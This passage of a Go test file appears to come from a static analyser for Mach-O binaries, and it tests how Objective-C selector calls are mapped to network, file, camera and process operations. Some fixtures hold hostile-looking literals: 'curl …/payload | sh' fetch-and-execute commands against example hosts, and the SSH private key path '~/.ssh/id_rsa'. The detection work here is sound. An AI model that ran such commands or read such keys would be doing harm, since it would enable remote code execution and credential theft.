	if len(graph.Features) != 1 || graph.Features[0].Key != "objc.message_call" || graph.Features[0].Value != "URLWithString:" || graph.Features[0].SourceFunction != "main" {
		t.Fatalf("missing scoped ObjC message feature: %#v", graph.Features)
	}
	if len(graph.Operations) != 0 || len(graph.Network) != 0 {
		t.Fatalf("constructor selector should not create network operation: operations=%#v network=%#v", graph.Operations, graph.Network)
	}
}

func TestObjCMessageStubCallAddsNetworkOperationForNSURLConnectionSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ok := addObjCMessageStubCall(&graph, content, []machoFunction{{Name: "main", Start: 0x1000, End: 0x1020, Reachable: true}}, map[uint64]string{
		0x2000: "sendSynchronousRequest:returningResponse:error:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "network.connect" || graph.Operations[0].SourceFunction != "main" || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("missing NSURLConnection network operation: %#v", graph.Operations)
	}
	if len(graph.Network) != 1 || graph.Network[0].Kind != behavior.NetworkImplementationAPICall || graph.Network[0].HTTPImplementation != "NSURLConnection" || graph.Network[0].TLSProvider != "Apple system TLS provider" {
		t.Fatalf("missing ObjC network detail: %#v", graph.Network)
	}
}

func TestObjCMessageStubCallDoesNotGuessURLFromSameFunctionXref(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "main", Start: 0x1000, End: 0x1020, Reachable: true}}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal: machoStringLiteral{
			VA:     0x3000,
			Offset: 80,
			Kind:   "url",
			Value:  "https://api.example/payload",
		},
	})
	ok := addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "sendSynchronousRequest:returningResponse:error:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "network.connect" || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("network operation must not guess its destination from same-function co-occurrence: %#v", graph.Operations)
	}
	var detail behavior.NetworkImplementationObservation
	for _, item := range graph.Network {
		if item.Kind == behavior.NetworkImplementationAPICall {
			detail = item
			break
		}
	}
	if len(detail.OperationIDs) != 1 || detail.OperationIDs[0] != graph.Operations[0].ID {
		t.Fatalf("ObjC network observation should reference the destination-bearing operation: %#v", graph.Network)
	}
	if !stringSliceContains(detail.UnresolvedProperties, "destination") {
		t.Fatalf("unproven destination should remain unresolved: %#v", detail.UnresolvedProperties)
	}
}

func TestObjCMessageStubCallDoesNotBindURLFromRequestObjectArgument(t *testing.T) {
	selectors := []string{
		"sendAsynchronousRequest:queue:completionHandler:",
		"sendSynchronousRequest:returningResponse:error:",
	}
	for _, selector := range selectors {
		t.Run(selector, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			function := machoFunction{Name: "main", Start: 0x1000, End: 0x1040, Reachable: true}
			const endpoint = "https://api.example/payload"
			addMachOStringXref(&graph, content, "arm64", machoStringXref{
				RefVA:    0x1000,
				Function: function,
				Literal: machoStringLiteral{
					VA:     0x3000,
					Offset: 80,
					Kind:   "url",
					Value:  endpoint,
				},
			})
			if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{
				0x2000: selector,
			}, 0x1004, 0x2000, "arm64", machoCallContext{Argument0String: endpoint}) {
				t.Fatal("expected called selector to be retained")
			}

			if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationNetworkConnect || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
				t.Fatalf("request-object selector must leave its destination unresolved with call-only evidence: %#v", graph.Operations)
			}
			if len(graph.Network) != 1 || !stringSliceContains(graph.Network[0].UnresolvedProperties, "destination") {
				t.Fatalf("request-object selector must retain unresolved destination coverage: %#v", graph.Network)
			}
		})
	}
}

func TestObjCMessageStubCallDoesNotPromoteSuspendedUploadTask(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "upload", Start: 0x1000, End: 0x1020, Reachable: true}}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal: machoStringLiteral{
			VA:     0x3000,
			Offset: 80,
			Kind:   "url",
			Value:  "https://api.example/upload",
		},
	})
	ok := addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "uploadTaskWithRequest:fromData:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC upload message stub call to be recognized")
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("uploadTask creation returns a suspended task and must remain feature-only: %#v", graph.Operations)
	}
	for _, detail := range graph.Network {
		if detail.Kind == behavior.NetworkImplementationAPICall {
			t.Fatalf("task creation without a linked resume must not create network-operation detail: %#v", graph.Network)
		}
	}
}

func TestObjCMessageStubCallDoesNotPromoteUnknownReceiverDownloadSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "download", Start: 0x1000, End: 0x1020, Reachable: true}}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal: machoStringLiteral{
			VA:     0x3000,
			Offset: 80,
			Kind:   "url",
			Value:  "https://api.example/payload",
		},
	})
	ok := addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "downloadFileFrom:andSaveAtPath:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC download message stub call to be recognized")
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("a custom download-like selector without receiver identity must remain feature-only: %#v", graph.Operations)
	}
	for _, detail := range graph.Network {
		if detail.Kind == behavior.NetworkImplementationAPICall {
			t.Fatalf("unknown receiver selector must not create network-operation detail: %#v", graph.Network)
		}
	}
}

func TestObjCMessageStubCallKeepsCustomSecuritySelectorsFeatureOnly(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "handleAuth", Start: 0x1000, End: 0x1040, Reachable: true}}
	stubs := map[uint64]string{
		0x2000: "ExecuteBash:",
		0x2010: "IsRootUser:andPassword:",
	}
	if !addObjCMessageStubCall(&graph, content, functions, stubs, 0x1004, 0x2000, "arm64") {
		t.Fatal("expected ExecuteBash selector to be recognized")
	}
	if !addObjCMessageStubCall(&graph, content, functions, stubs, 0x1010, 0x2010, "arm64") {
		t.Fatal("expected password validation selector to be recognized")
	}

	if len(graph.Features) != 2 || graph.Features[0].Key != "objc.message_call" || graph.Features[1].Key != "objc.message_call" {
		t.Fatalf("custom selectors should remain neutral called-message features: %#v", graph.Features)
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("custom selectors without receiver/API proof must not produce operations: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallDoesNotExpandShellCommandForCustomSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "runShell", Start: 0x1000, End: 0x1040, Reachable: true}}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "shell-command", Value: "curl https://objc-shell.example/payload | sh"},
	})
	ok := addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "ExecuteBash:",
	}, 0x1004, 0x2000, "x86_64")

	if !ok {
		t.Fatal("expected ExecuteBash selector to be recognized")
	}
	if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
		t.Fatalf("custom selector plus nearby command must remain feature-only: operations=%#v relations=%#v", graph.Operations, graph.Relations)
	}
	if !featureHasValue(graph.Features, "objc.message_call", "ExecuteBash:") || !featureHasValue(graph.Features, "macho.shell_command", "curl https://objc-shell.example/payload | sh") {
		t.Fatalf("neutral selector and literal features should be retained: %#v", graph.Features)
	}
}

func TestObjCMessageStubCallLeavesMultipleShellCommandXrefsUnexpanded(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "runShell", Start: 0x1000, End: 0x1040, Reachable: true}}
	for i, command := range []string{
		"curl https://one.example/payload | sh",
		"curl https://two.example/payload | sh",
	} {
		addMachOStringXref(&graph, content, "x86_64", machoStringXref{
			RefVA:    0x1000 + uint64(i),
			Function: functions[0],
			Literal:  machoStringLiteral{VA: 0x3000 + uint64(i), Offset: 80 + i, Kind: "shell-command", Value: command},
		})
	}
	addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "ExecuteBash:",
	}, 0x1004, 0x2000, "x86_64")

	if hasOperationWithArch(&graph, "network.download", "network-destination", "https://one.example/payload", "runShell", "x86_64") ||
		hasOperationWithArch(&graph, "network.download", "network-destination", "https://two.example/payload", "runShell", "x86_64") ||
		hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("ambiguous ExecuteBash command xrefs should not be expanded: operations=%#v chains=%#v", graph.Operations, graph.Relations)
	}
}

func TestObjCSelectorReferenceAloneDoesNotPromoteCustomSecuritySelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ev := graph.AddEvidence(behavior.Evidence{
		NodeID:  content.NodeID,
		Logical: content.LogicalPath,
		Method:  "macho-objc",
		Kind:    "objc-selector",
		Value:   "ExecuteBash:",
	})
	graph.AddFeature(behavior.Feature{
		NodeID:      content.NodeID,
		Key:         "objc.selector_ref",
		Value:       "ExecuteBash:",
		EvidenceIDs: []string{ev},
		Support:     behavior.SupportCorroborated,
	})

	if len(graph.Operations) != 0 {
		t.Fatalf("selector references without decoded calls must remain features: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallDoesNotPromoteGenericPasswordSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ok := addObjCMessageStubCall(&graph, content, []machoFunction{{Name: "settings", Start: 0x1000, End: 0x1020, Reachable: true}}, map[uint64]string{
		0x2000: "validatePassword:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected generic password selector to be recognized as a message call")
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("generic password selector should stay a feature, not a credential operation: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallIgnoresURLXrefFromDifferentFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{
		{Name: "other", Start: 0x1000, End: 0x1020, Reachable: true},
		{Name: "main", Start: 0x1100, End: 0x1120, Reachable: true},
	}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "url", Value: "https://other.example/payload"},
	})
	addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "sendSynchronousRequest:returningResponse:error:",
	}, 0x1104, 0x2000, "arm64")

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("network operation should not use URL xref from another function: %#v", graph.Operations)
	}
	for _, item := range graph.Network {
		if item.Kind == behavior.NetworkImplementationAPICall && !stringSliceContains(item.UnresolvedProperties, "destination") {
			t.Fatalf("ObjC network observation should retain an unresolved destination: %#v", graph.Network)
		}
	}
}

func TestObjCMessageStubCallLeavesMultipleURLXrefsUnresolved(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "main", Start: 0x1000, End: 0x1020, Reachable: true}}
	for i, value := range []string{"https://one.example/payload", "https://two.example/payload"} {
		addMachOStringXref(&graph, content, "arm64", machoStringXref{
			RefVA:    0x1000 + uint64(i),
			Function: functions[0],
			Literal:  machoStringLiteral{VA: 0x3000 + uint64(i), Offset: 80 + i, Kind: "url", Value: value},
		})
	}
	addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "sendSynchronousRequest:returningResponse:error:",
	}, 0x1004, 0x2000, "arm64")

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("multiple URL xrefs should leave operation destination unresolved: %#v", graph.Operations)
	}
	for _, item := range graph.Network {
		if item.Kind == behavior.NetworkImplementationAPICall && !stringSliceContains(item.UnresolvedProperties, "destination") {
			t.Fatalf("multiple URL xrefs should leave ObjC observation destination unresolved: %#v", graph.Network)
		}
	}
}

func stringSliceContains(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

func hasStringLiteralKind(literals []machoStringLiteral, kind string) bool {
	for _, literal := range literals {
		if literal.Kind == kind {
			return true
		}
	}
	return false
}

func hasStringLiteralValue(literals []machoStringLiteral, value string) bool {
	for _, literal := range literals {
		if literal.Value == value {
			return true
		}
	}
	return false
}

func hasOperationKind(graph *behavior.Graph, kind behavior.OperationKind) bool {
	for _, operation := range graph.Operations {
		if operation.Kind == kind {
			return true
		}
	}
	return false
}

func hasOperation(graph *behavior.Graph, kind behavior.OperationKind, category, concrete, function string) bool {
	return hasOperationWithArch(graph, kind, category, concrete, function, "x86_64")
}

func hasOperationWithArch(graph *behavior.Graph, kind behavior.OperationKind, category, concrete, function, arch string) bool {
	for _, operation := range graph.Operations {
		if operation.Kind == kind &&
			testOperationHasResource(operation, category, concrete) &&
			operation.SourceFunction == function &&
			operation.Architecture == arch {
			return true
		}
	}
	return false
}

func hasFeatureQualifier(graph *behavior.Graph, key, value, qualifier, qualifierValue string) bool {
	for _, feature := range graph.Features {
		if feature.Key == key && feature.Value == value && feature.Qualifiers[qualifier] == qualifierValue {
			return true
		}
	}
	return false
}

func hasFeatureArchitecture(graph *behavior.Graph, key, value, architecture string) bool {
	for _, feature := range graph.Features {
		if feature.Key == key && feature.Value == value && feature.Architecture == architecture {
			return true
		}
	}
	return false
}

func featureHasValue(features []behavior.Feature, key, value string) bool {
	for _, feature := range features {
		if feature.Key == key && feature.Value == value {
			return true
		}
	}
	return false
}

func TestObjCMessageStubCallAddsFileReadOperationForContentsSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ok := addObjCMessageStubCall(&graph, content, []machoFunction{{Name: "collect", Start: 0x1000, End: 0x1020, Reachable: true}}, map[uint64]string{
		0x2000: "dataWithContentsOfFile:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "file.read" || graph.Operations[0].RequiredResource().Kind != "file" {
		t.Fatalf("missing file-read operation: %#v", graph.Operations)
	}
	if graph.Operations[0].SourceFunction != "collect" || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("file-read selector should preserve its function without inventing a root: %#v", graph.Operations[0])
	}
	if len(graph.Network) != 0 {
		t.Fatalf("file-read selector should not create network detail: %#v", graph.Network)
	}
}

func TestMachOObjCOperationRecognizerTableIsExactSortedAndValid(t *testing.T) {
	for index, recognizer := range machoObjCOperationRecognizers {
		if recognizer.Selector == "" || !behavior.ValidOperationKind(recognizer.Kind) {
			t.Fatalf("invalid recognizer at %d: %#v", index, recognizer)
		}
		if index > 0 && machoObjCOperationRecognizers[index-1].Selector >= recognizer.Selector {
			t.Fatalf("recognizer table is not strictly sorted at %d: %q >= %q", index, machoObjCOperationRecognizers[index-1].Selector, recognizer.Selector)
		}
		got, ok := machoObjCOperationRecognizerForSelector(recognizer.Selector)
		if !ok || got != recognizer {
			t.Fatalf("lookup(%q) = %#v, %v; want %#v", recognizer.Selector, got, ok, recognizer)
		}
	}
}

func TestObjCMessageStubCallAddsNeutralCameraAndDirectoryOperations(t *testing.T) {
	tests := []struct {
		selector string
		kind     behavior.OperationKind
		resource behavior.ResourceKind
	}{
		{"capturePhotoWithSettings:delegate:", behavior.OperationCameraCapture, behavior.ResourceCamera},
		{"captureStillImageAsynchronouslyFromConnection:completionHandler:", behavior.OperationCameraCapture, behavior.ResourceCamera},
		{"contentsOfDirectoryAtPath:error:", behavior.OperationFileEnumerate, behavior.ResourceFile},
		{"createDirectoryAtPath:withIntermediateDirectories:attributes:error:", behavior.OperationDirectoryCreate, behavior.ResourceFile},
		{"launchedApplications", behavior.OperationProcessEnumerate, behavior.ResourceProcess},
		{"removeItemAtPath:error:", behavior.OperationFileDelete, behavior.ResourceFile},
		{"runningApplications", behavior.OperationProcessEnumerate, behavior.ResourceProcess},
	}
	for _, test := range tests {
		t.Run(test.selector, func(t *testing.T) {
			var graph behavior.Graph
			if !addObjCMessageStubCall(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "benign-control"}, []machoFunction{{Name: "perform", Start: 0x1000, End: 0x1020, Reachable: true}}, map[uint64]string{0x2000: test.selector}, 0x1004, 0x2000, "arm64") {
				t.Fatal("expected called selector to be retained")
			}
			if len(graph.Operations) != 1 || graph.Operations[0].Kind != test.kind || graph.Operations[0].RequiredResource().Kind != test.resource || graph.Operations[0].Support != behavior.SupportHeuristic {
				t.Fatalf("selector operation = %#v", graph.Operations)
			}
			if graph.Operations[0].Qualifiers["receiver_identity"] != "unresolved" {
				t.Fatalf("unresolved receiver was not disclosed: %#v", graph.Operations[0])
			}
		})
	}
}

func TestObjCMessageStubCallDoesNotPromoteNearCameraOrDirectorySelectors(t *testing.T) {
	for _, selector := range []string{"capturePhoto:", "capturePhotoWithSettings:", "contentsOfDirectory:", "launchedApplication", "removeItemAtPaths:", "runningApplication", "CreateDirectoryAtPath:attributes:"} {
		var graph behavior.Graph
		if !addObjCMessageStubCall(&graph, artifact.Content{NodeID: "node-1"}, []machoFunction{{Name: "perform", Start: 0x1000, End: 0x1020}}, map[uint64]string{0x2000: selector}, 0x1004, 0x2000, "arm64") {
			t.Fatalf("called selector %q was not retained", selector)
		}
		if len(graph.Operations) != 0 {
			t.Fatalf("near selector %q produced operations: %#v", selector, graph.Operations)
		}
	}
}

func TestObjCMessageStubCallAddsExactFoundationFileWriteOperations(t *testing.T) {
	selectors := []string{
		"writeToFile:atomically:",
		"writeToFile:atomically:encoding:error:",
		"writeToFile:options:error:",
	}
	for _, selector := range selectors {
		t.Run(selector, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "benign-preferences"}
			functions := []machoFunction{{Name: "savePreferences", Start: 0x1000, End: 0x1020, Reachable: true}}
			if !addObjCMessageStubCall(&graph, content, functions, map[uint64]string{0x2000: selector}, 0x1004, 0x2000, "arm64") {
				t.Fatal("expected called selector to be retained")
			}
			if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileWrite || graph.Operations[0].RequiredResource().Kind != behavior.ResourceFile || graph.Operations[0].RequiredResource().Value != "" {
				t.Fatalf("exact write selector should produce one unresolved neutral file write: %#v", graph.Operations)
			}
			if graph.Operations[0].SourceFunction != "savePreferences" || graph.Operations[0].Architecture != "arm64" || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown || graph.Operations[0].Support != behavior.SupportHeuristic {
				t.Fatalf("file write lost scoped static context: %#v", graph.Operations[0])
			}
			if graph.Operations[0].Qualifiers["receiver_identity"] != "unresolved" || graph.Operations[0].Qualifiers["semantic_basis"] != "exact-called-selector" || graph.Operations[0].Qualifiers["selector"] != selector {
				t.Fatalf("selector-semantic inference must disclose its unresolved receiver: %#v", graph.Operations[0].Qualifiers)
			}
			if len(graph.Relations) != 0 {
				t.Fatalf("an unresolved benign file write must not fabricate a resource relation: %#v", graph.Relations)
			}
		})
	}
}

func TestObjCMessageStubCallBindsExactStaticCFStringPath(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "benign-control", ByteOffsetBase: 0x100}
	function := machoFunction{Name: "collect", Start: 0x1000, End: 0x1040, Reachable: true}
	context := machoCallContext{}
	context.setStringArgument(2, machoCallStringArgument{
		Value:          "~/.ssh/id_rsa",
		ReferenceVA:    0x1000,
		ReferenceOff:   0x20,
		LiteralVA:      0x2000,
		LiteralOffset:  0x80,
		BackingVA:      0x3000,
		BackingOffset:  0xc0,
		Representation: "static-cfstring",
	})
	if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{
		0x2000: "dataWithContentsOfFile:",
	}, 0x1004, 0x2000, "arm64", context) {
		t.Fatal("expected called selector to be retained")
	}

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileRead {
		t.Fatalf("exact static NSString argument did not produce neutral file read: %#v", graph.Operations)
	}
	operation := graph.Operations[0]
	resource := operation.RequiredResource()
	if resource.Kind != behavior.ResourceFile || resource.Value != "~/.ssh/id_rsa" || !slices.Contains(resource.Classifications, behavior.ResourceClassSSHPrivateKey) {
		t.Fatalf("exact Objective-C path lost resource classification: %#v", resource)
	}
	if operation.Support != behavior.SupportHeuristic || operation.Qualifiers["receiver_identity"] != "unresolved" || operation.Qualifiers["resource_binding"] != "exact-call-argument" || operation.Qualifiers["argument_representation"] != "static-cfstring" {
		t.Fatalf("Objective-C operation support/provenance is overstated: %#v", operation)
	}
	if len(operation.EvidenceIDs) != 4 {
		t.Fatalf("operation must retain call, register reference, CFString object, and backing evidence: %#v", operation.EvidenceIDs)
	}
	var argumentFeature *behavior.Feature
	for index := range graph.Features {
		if graph.Features[index].Key == "objc.message_argument" {
			argumentFeature = &graph.Features[index]
			break
		}
	}
	if argumentFeature == nil || argumentFeature.Value != "~/.ssh/id_rsa" || argumentFeature.Qualifiers["selector"] != "dataWithContentsOfFile:" || argumentFeature.Qualifiers["argument_index"] != "0" || argumentFeature.Qualifiers["representation"] != "static-cfstring" || len(argumentFeature.EvidenceIDs) != 4 {
		t.Fatalf("missing exact Objective-C argument feature lineage: %#v", graph.Features)
	}
}

func TestObjCFilesystemSelectorsBindExactStaticPaths(t *testing.T) {
	content := artifact.Content{NodeID: "node-1", LogicalPath: "benign-file-manager", ByteOffsetBase: 0x100}
	function := machoFunction{Name: "manageFiles", Start: 0x1000, End: 0x1100, Reachable: true}
	for _, test := range []struct {
		name       string
		selector   string
		kind       behavior.OperationKind
		arguments  []string
		wantValues map[behavior.ResourceRole]string
	}{
		{name: "metadata", selector: "fileExistsAtPath:", kind: behavior.OperationFileMetadataQuery, arguments: []string{"/tmp/item"}, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleSource: "/tmp/item"}},
		{name: "enumerate", selector: "enumeratorAtPath:", kind: behavior.OperationFileEnumerate, arguments: []string{"/Users/alice/Documents"}, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleSource: "/Users/alice/Documents"}},
		{name: "copy", selector: "copyItemAtPath:toPath:error:", kind: behavior.OperationFileCopy, arguments: []string{"/tmp/source", "/tmp/copy"}, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleSource: "/tmp/source", behavior.ResourceRoleLocalOutput: "/tmp/copy"}},
		{name: "move", selector: "moveItemAtPath:toPath:error:", kind: behavior.OperationFileMove, arguments: []string{"/tmp/source", "/tmp/moved"}, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleSource: "/tmp/source", behavior.ResourceRoleTarget: "/tmp/moved"}},
		{name: "delete", selector: "removeItemAtPath:", kind: behavior.OperationFileDelete, arguments: []string{"/tmp/stale"}, wantValues: map[behavior.ResourceRole]string{behavior.ResourceRoleTarget: "/tmp/stale"}},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			context := machoCallContext{}
			for index, value := range test.arguments {
				context.setStringArgument(index+2, machoCallStringArgument{
					Value: value, ReferenceVA: 0x1010 + uint64(index*8), ReferenceOff: 0x10 + index*8,
					LiteralVA: 0x2000 + uint64(index*0x20), LiteralOffset: 0x80 + index*0x20,
					Representation: "static-cfstring",
				})
			}
			if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{0x3000: test.selector}, 0x1080, 0x3000, "arm64", context) {
				t.Fatal("expected called selector to be retained")
			}
			if len(graph.Operations) != 1 || graph.Operations[0].Kind != test.kind {
				t.Fatalf("operation = %#v, want one %s", graph.Operations, test.kind)
			}
			operation := graph.Operations[0]
			if operation.Support != behavior.SupportHeuristic || operation.Qualifiers["receiver_identity"] != "unresolved" {
				t.Fatalf("unresolved Objective-C receiver must keep operation heuristic: %#v", operation)
			}
			for role, value := range test.wantValues {
				binding, ok := operation.FirstBinding(role)
				if !ok || binding.Resource.Value != value || len(binding.EvidenceIDs) != 2 {
					t.Fatalf("%s binding = %#v, want %q with exact reference and literal evidence", role, binding, value)
				}
			}
			wantBinding := "exact-call-argument"
			if len(test.arguments) == 2 {
				wantBinding = "exact-call-arguments"
			}
			if operation.Qualifiers["resource_binding"] != wantBinding {
				t.Fatalf("resource binding provenance = %#v, want %q", operation.Qualifiers, wantBinding)
			}
		})
	}
}

func TestObjCFileMoveRequiresBothEvidencedArgumentsForExactBinding(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "partial-file-manager"}
	function := machoFunction{Name: "moveFile", Start: 0x1000, End: 0x1100, Reachable: true}
	context := machoCallContext{}
	context.setStringArgument(2, machoCallStringArgument{
		Value: "/tmp/source", ReferenceVA: 0x1010, ReferenceOff: 0x10,
		LiteralVA: 0x2000, LiteralOffset: 0x80, Representation: "static-cfstring",
	})
	context.setStringArgument(3, machoCallStringArgument{Value: "/tmp/coincident", Representation: "raw-c-string"})
	if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{0x3000: "moveItemAtPath:toPath:error:"}, 0x1080, 0x3000, "arm64", context) {
		t.Fatal("expected called selector to be retained")
	}
	if len(graph.Operations) != 1 {
		t.Fatalf("operations = %#v, want one neutral file move", graph.Operations)
	}
	operation := graph.Operations[0]
	source, sourceOK := operation.FirstBinding(behavior.ResourceRoleSource)
	target, targetOK := operation.FirstBinding(behavior.ResourceRoleTarget)
	if !sourceOK || source.Resource.Value != "/tmp/source" || len(source.EvidenceIDs) != 2 || !targetOK || target.Resource.Value != "" || len(target.EvidenceIDs) != 0 {
		t.Fatalf("partial bindings lost exact lineage distinction: source=%#v target=%#v", source, target)
	}
	if operation.Qualifiers["resource_binding"] != "partial-exact-call-arguments" {
		t.Fatalf("partial binding provenance = %#v", operation.Qualifiers)
	}
}

func TestObjCMessageStubCallDoesNotBindUnprovenNSStringPath(t *testing.T) {
	var graph behavior.Graph
	context := machoCallContext{}
	context.setStringArgument(2, machoCallStringArgument{Value: "~/.ssh/id_rsa", Representation: "raw-c-string"})
	if !addObjCMessageStubCallWithContext(&graph, artifact.Content{NodeID: "node-1"}, []machoFunction{{Name: "collect", Start: 0x1000, End: 0x1040}}, map[uint64]string{
		0x2000: "dataWithContentsOfFile:",
	}, 0x1004, 0x2000, "arm64", context) {
		t.Fatal("expected called selector to be retained")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" || graph.Operations[0].Qualifiers["resource_binding"] != "unresolved" || len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("unproven NSString path must remain unresolved: %#v", graph.Operations)
	}
	for _, feature := range graph.Features {
		if feature.Key == "objc.message_argument" {
			t.Fatalf("unproven NSString argument must not become a feature: %#v", feature)
		}
	}
}

func TestObjCMessageStubCallDoesNotBindFileWriteFromRawCStringEvidence(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "save", Start: 0x1000, End: 0x1040, Reachable: true}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "process-launch-path",
			Value:    "/tmp/output.bin",
			Resource: behavior.NewResource(behavior.ResourceFile, "/tmp/output.bin"),
		},
	})
	if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{
		0x2000: "writeToFile:options:error:",
	}, 0x1004, 0x2000, "arm64", machoCallContext{Argument0String: "/tmp/output.bin"}) {
		t.Fatal("expected called selector to be retained")
	}

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileWrite || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("raw C-string evidence cannot prove an NSString output path: %#v", graph.Operations)
	}
	if len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("unresolved file write should retain only selector-call evidence: %#v", graph.Operations[0])
	}
}

func TestObjCMessageStubCallDoesNotBindFileReadFromRawCStringEvidence(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "collect", Start: 0x1000, End: 0x1040, Reachable: true}
	const path = "~/.ssh/id_rsa"
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "sensitive-resource",
			Value:    path,
			Resource: behavior.NewResource(behavior.ResourceFile, path, behavior.ResourceClassSSHPrivateKey),
		},
	})
	if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{
